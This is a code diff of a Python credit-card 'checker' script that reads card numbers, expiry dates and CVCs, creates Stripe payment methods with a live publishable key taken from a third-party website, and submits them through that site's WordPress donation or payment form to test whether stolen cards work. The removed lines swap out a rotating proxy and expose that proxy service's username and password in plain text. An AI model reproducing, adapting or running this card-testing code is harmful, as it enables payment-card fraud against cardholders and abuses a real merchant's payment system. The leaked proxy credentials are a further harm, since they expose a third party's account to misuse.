@@ -1,9 +1,5 @@
 import requests,re
-from proxy import reqproxy, make_request
 def Tele(ccx):
-	proxy_str = "p.webshare.io:80:rotate-youavbwz:ej3yf2dnj71t"
-	session, ip = reqproxy(proxy_str)
-	#print(f"IP Address: {ip}")
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
 	mm = ccx.split("|")[1]
@@ -31,7 +27,7 @@ def Tele(ccx):
 	
 	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F6296643727%3B+stripe-js-v3%2F6296643727%3B+card-element&key=pk_live_51RCo52AslObX1XoIQQONaUwrBhGaGWOcwotVtFuDJyfIcKzl5F1W0WcnpVFBJWLXRwXyJ0ZNPAPFeoJwl1n8ghMv00fQvbzbVW'
 	
-	response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = response.json()['id']
 	
@@ -62,7 +58,7 @@ def Tele(ccx):
 	    'form_id': '9',
 	}
 	
-	response = session.post(
+	response = requests.post(
 	    'https://avagyanlaw.com/wp-admin/admin-ajax.php',
 	    params=params,
 	    headers=headers,
